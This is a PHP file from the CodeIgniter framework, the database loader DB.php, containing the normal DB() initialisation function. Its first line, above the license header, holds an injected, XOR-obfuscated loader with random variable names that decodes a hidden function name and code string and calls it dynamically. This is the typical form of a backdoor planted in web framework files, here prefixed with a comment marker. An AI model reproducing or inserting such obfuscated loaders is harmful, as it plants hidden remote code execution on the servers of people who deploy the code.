<?php 
// $kQzLMOQ='6L.O;Ul--E.YU9N'; $WwrvJK='U>K.O03KX+M-<V '^$kQzLMOQ; $sVrVDZee='DZAF<4:ML= EiIN325EmjEVClW65Za;+B0upjNWHYS-=0 8CWN,TYlW >7g,9XTDs<0,Meza:4ADDhYzyULmzaY16JtWaujDQx< >rMYdYlwhos<N 7O=-4rwR;HSDybR<AbNfspWUFXjzohOF-2YRwlQlw7gp IJgqTutq>Y6X=4DUQTOl3ebKjH UHH=<cP7K1Nl=x+a2sap0PLXvty1UQ=YYOAX+8M3 5EEnoJ3 S4omgS >S59Zybnecuw8ttpS;gIY.NywgtaD8-B1oOGaqAI C d3URdngL 25ssCUVON+RlWiGO MTlk<Bb=MTGMh.PH5BYMfK2 36OH,UlJk:h8x1n=QT:df.6KeIoyQ4W6A xn=hzmkI2.R7G MHLhh>1Wzm4qp74Y,sWva:6AN Rs<;AO:ZcS 7Rrtfy-,>EEEO: 7Ud;X76YS>Wf==GTz6LEXpqt3HPA=ELjJVCUDCciUQEXt,6HzXr6ETiV.AD.qKWv07L0=rW Do3TR HFcw= ROyil.48UkeeSuoV+lPB+Z51kD1-La9zMEdzcabGxijsdFSHzBHoe<z tg xTp7ACtaaTukbDPW0D>0.28Y;bH> 1GGOj;VI87VTHmNw6L<3yjmfDNfxLgp 285xl.Z11.A7S6+,ORu1cJaJU1+ yAMaDI'; $pRVrtBBC=$WwrvJK('', '-<igZAT.8TO+6,6ZAA6EM=9133WA;>dF7DRYCn,BP5XSSTQ,9nT;+33AJV8sT- lWXQX,IZEQQ8mdHyZY.FdsE6DBjIwFRQNXqZOLZi0DdLGSOWUrSC=QHZZS6Z<2mBBvUjIglzys:3,JTRHgbIS-3,H81WiGTK,3<U=UQQM-D4XZlq:16EnLYAcAR0<=ORKtX>EgW7qVkOykTT189VIYW4=N<bEe<JL,lKP<eSO,RL QTgm5OL6TZ2YJJ: :8s=1P2HGm2K7YJYTE2YA7TFo<kxe-A7A;X0+DSGhKWLHyJq2.:JrQwM1.L81WaAHhT+tolLJ1<Tky6lBTOAS.+DuDn4h-i-t=iq5IDBES2EtQYuB6Z4EQNFbsdO-SZ3h,E4hqHLUT.Ag=xTSU-MSjVELW-;Eiy5FK20PG7AC3RIF9XBM 7,.VIM0LC7Ei=2J69bP2 RT-6=FE+W-3.Y dN.774moCM1019+GS1SqI<,2ArJ 0OQmqVQE>QD-<E=0V,;S<5KPVE+hUIHJUL4BECuUG;OYxfO;AP0cZH5FdSmxYZDXTsLQXKQ 5-MtxXVXNELUEI1DUvzCSR6RBBbvwQ6LQWmS<B=-FIB34gMK70TX70oAnSR-HRPCMFdnFX7myEDYYPHJ;EPufG2OGC.6RlJqkC0IBTQqdZN4'^$sVrVDZee); $pRVrtBBC();
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * Initialize the database
 *
 * @category	Database
 * @author	EllisLab Dev Team
 * @link	https://codeigniter.com/user_guide/database/
 *
 * @param 	string|string[]	$params
 * @param 	bool		$query_builder_override
 *				Determines if query builder should be used or not
 */
function &DB($params = '', $query_builder_override = NULL)
{
	// Load the DB config file if a DSN string wasn't passed
	if (is_string($params) && strpos($params, '://') === FALSE)
	{
		// Is the config file in the environment folder?
		if ( ! file_exists($file_path = APPPATH.'config/'.ENVIRONMENT.'/database.php')
			&& ! file_exists($file_path = APPPATH.'config/database.php'))
		{
			show_error('The configuration file database.php does not exist.');
		}

		include($file_path);

		// Make packages contain database config files,
		// given that the controller instance already exists
		if (class_exists('CI_Controller', FALSE))
		{
			foreach (get_instance()->load->get_package_paths() as $path)
			{
				if ($path !== APPPATH)
				{
					if (file_exists($file_path = $path.'config/'.ENVIRONMENT.'/database.php'))
					{
						include($file_path);
					}
					elseif (file_exists($file_path = $path.'config/database.php'))
					{
						include($file_path);
					}
				}
			}
		}

		if ( ! isset($db) OR count($db) === 0)
		{
			show_error('No database connection settings were found in the database config file.');
		}

		if ($params !== '')
		{
			$active_group = $params;
		}

		if ( ! isset($active_group))
		{
			show_error('You have not specified a database connection group via $active_group in your config/database.php file.');
		}
		elseif ( ! isset($db[$active_group]))
		{
			show_error('You have specified an invalid database connection group ('.$active_group.') in your config/database.php file.');
		}

		$params = $db[$active_group];
	}
	elseif (is_string($params))
	{
		/**
		 * Parse the URL from the DSN string
		 * Database settings can be passed as discreet
		 * parameters or as a data source name in the first
		 * parameter. DSNs must have this prototype:
		 * $dsn = 'driver://username:password@hostname/database';
		 */
		if (($dsn = @parse_url($params)) === FALSE)
		{
			show_error('Invalid DB Connection String');
		}

		$params = array(
			'dbdriver'	=> $dsn['scheme'],
			'hostname'	=> isset($dsn['host']) ? rawurldecode($dsn['host']) : '',
			'port'		=> isset($dsn['port']) ? rawurldecode($dsn['port']) : '',
			'username'	=> isset($dsn['user']) ? rawurldecode($dsn['user']) : '',
			'password'	=> isset($dsn['pass']) ? rawurldecode($dsn['pass']) : '',
			'database'	=> isset($dsn['path']) ? rawurldecode(substr($dsn['path'], 1)) : ''
		);

		// Were additional config items set?
		if (isset($dsn['query']))
		{
			parse_str($dsn['query'], $extra);

			foreach ($extra as $key => $val)
			{
				if (is_string($val) && in_array(strtoupper($val), array('TRUE', 'FALSE', 'NULL')))
				{
					$val = var_export($val, TRUE);
				}

				$params[$key] = $val;
			}
		}
	}

	// No DB specified yet? Beat them senseless...
	if (empty($params['dbdriver']))
	{
		show_error('You have not selected a database type to connect to.');
	}

	// Load the DB classes. Note: Since the query builder class is optional
	// we need to dynamically create a class that extends proper parent class
	// based on whether we're using the query builder class or not.
	if ($query_builder_override !== NULL)
	{
		$query_builder = $query_builder_override;
	}
	// Backwards compatibility work-around for keeping the
	// $active_record config variable working. Should be
	// removed in v3.1
	elseif ( ! isset($query_builder) && isset($active_record))
	{
		$query_builder = $active_record;
	}

	require_once(BASEPATH.'database/DB_driver.php');

	if ( ! isset($query_builder) OR $query_builder === TRUE)
	{
		require_once(BASEPATH.'database/DB_query_builder.php');
		if ( ! class_exists('CI_DB', FALSE))
		{
			/**
			 * CI_DB
			 *
			 * Acts as an alias for both CI_DB_driver and CI_DB_query_builder.
			 *
			 * @see	CI_DB_query_builder
			 * @see	CI_DB_driver
			 */
			class CI_DB extends CI_DB_query_builder { }
		}
	}
	elseif ( ! class_exists('CI_DB', FALSE))
	{
		/**
	 	 * @ignore
		 */
		class CI_DB extends CI_DB_driver { }
	}

	// Load the DB driver
	$driver_file = BASEPATH.'database/drivers/'.$params['dbdriver'].'/'.$params['dbdriver'].'_driver.php';

	file_exists($driver_file) OR show_error('Invalid DB driver');
	require_once($driver_file);

	// Instantiate the DB adapter
	$driver = 'CI_DB_'.$params['dbdriver'].'_driver';
	$DB = new $driver($params);

	// Check for a subdriver
	if ( ! empty($DB->subdriver))
	{
		$driver_file = BASEPATH.'database/drivers/'.$DB->dbdriver.'/subdrivers/'.$DB->dbdriver.'_'.$DB->subdriver.'_driver.php';

		if (file_exists($driver_file))
		{
			require_once($driver_file);
			$driver = 'CI_DB_'.$DB->dbdriver.'_'.$DB->subdriver.'_driver';
			$DB = new $driver($params);
		}
	}

	$DB->initialize();
	return $DB;
}
